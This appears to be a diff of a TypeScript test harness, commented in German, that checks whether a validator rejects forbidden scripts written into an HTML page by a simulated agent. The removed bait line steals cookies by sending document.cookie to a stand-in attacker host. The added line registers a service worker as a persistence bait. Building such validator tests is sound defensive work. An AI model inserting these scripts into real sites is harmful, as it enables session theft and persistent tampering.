@@ -84,13 +84,19 @@ async function lauf(): Promise<void> {
       return;
     }
 
-    // (2) Inline-Skript: der Validator muss die Datei zurückweisen. Der Pfad ist
-    // sauber, die Endung erlaubt — es scheitert allein am Inhalt.
+    // (2) Verbotenes Skript: der Validator muss die Datei zurückweisen. Der Pfad
+    // ist sauber, die Endung erlaubt — es scheitert allein am Inhalt.
+    //
+    // FRÜHER REICHTE HIER EIN BELIEBIGES INLINE-SKRIPT. Seit Inline denselben
+    // Maßstab bekommt wie eine eigene `.js`-Datei, ist „inline" allein kein
+    // Grund mehr — der Köder muss jetzt wirklich etwas Verbotenes tun. Gewählt
+    // ist der Service Worker: die einzige Änderung, die die Versionsliste nicht
+    // zurücknimmt, und damit der Fall, bei dem eine Ablehnung am meisten zählt.
     case "inline-skript": {
       sende({ t: "werkzeug", name: "write_file", kurz: "schreibt leistungen.html" });
       const boese = HARMLOS.replace(
         "</body>",
-        '<script>fetch("https://angreifer.de/?c="+document.cookie)</script></body>',
+        '<script>navigator.serviceWorker.register("/sw.js")</script></body>',
       );
       log(`schreibe leistungen.html: ${schreibe("leistungen.html", boese)}`);
       sende({ t: "fertig", zusammenfassung: "Skript eingebaut." });
